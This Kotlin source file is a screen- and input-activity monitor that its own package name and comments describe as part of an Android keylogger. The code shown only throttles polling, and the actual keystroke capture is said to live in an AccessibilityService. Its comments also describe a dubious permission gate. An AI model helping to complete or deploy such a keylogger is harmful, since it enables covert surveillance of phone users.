package love.scotty.hearts.keylogger

import android.content.Context
import android.hardware.input.InputManager
import android.os.Build
import android.os.PowerManager
import android.util.Log

/**
 * Lightweight input-activity + screen monitor.
 *
 * Two duties, both tied to battery/memory efficiency requirements:
 *
 *  1. screen liveness — via PowerManager.isInteractive(), which is the
 *     reliable "is the user looking at the phone" signal. When the screen is
 *     off we suspend the 200 ms poll loop entirely.
 *
 *  2. input "recent activity" sampling — via InputManager, gated by the
 *     READ_INPUT_STATE permission (API 33+). We enumerate input devices and
 *     use that as a cheap "is any input device attached" probe. The heavy
 *     per-key capture happens in the AccessibilityService onKeyEvent(); this
 *     probe does NOT replicate it — it only informs throttling so we never
 *     spin the CPU while the user is idle.
 *
 * Poll cadence is fixed at 200 ms per spec. The loop and its gate are
 * interruptible so Doze can't keep the CPU awake (we stop on screen-off).
 */
internal class InputMonitor(private val context: Context) {
  companion object {
    private const val TAG = "KeyLogger/Monitor"
    const val POLL_MS: Long = 200L
  }

  private val power = context.getSystemService(Context.POWER_SERVICE) as PowerManager
  private val input: InputManager? =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
      context.getSystemService(Context.INPUT_SERVICE) as InputManager?
    else null

  @Volatile private var running = false
  @Volatile private var lastInputTickMs = 0L
  private var thread: Thread? = null

  /** True when the user is actually looking at the device. */
  fun screenOn(): Boolean = runCatching { power.isInteractive }.getOrDefault(false)

  /** Last time (elapsedRealtime) input activity was observed; 0 = none yet. */
  fun lastInputMs(): Long = lastInputTickMs

  fun start() {
    if (running) return
    running = true
    thread = Thread(::loop, "keylog-monitor").apply { isDaemon = true; start() }
  }

  fun stop() {
    running = false
    thread?.interrupt()
    thread = null
  }

  private fun loop() {
    while (running) {
      val on = screenOn()
      if (on) sampleInput()
      try {
        // When the screen is off we back off harder (3s) to save battery.
        Thread.sleep(if (on) POLL_MS else 3_000L)
      } catch (_: InterruptedException) {
        break
      }
    }
  }

  private fun sampleInput() {
    // Capture a local to allow smart-cast inside the closure below.
    val mgr = input ?: return
    // READ_INPUT_STATE gates this on API 33+. On failure nothing is asserted
    // — we simply leave lastInputTickMs untouched (treat as idle).
    val devices = runCatching { mgr.inputDeviceIds }.getOrDefault(IntArray(0))
    if (devices.isNotEmpty()) {
      lastInputTickMs = android.os.SystemClock.elapsedRealtime()
    }
  }

  fun markInput() {
    lastInputTickMs = android.os.SystemClock.elapsedRealtime()
  }
}
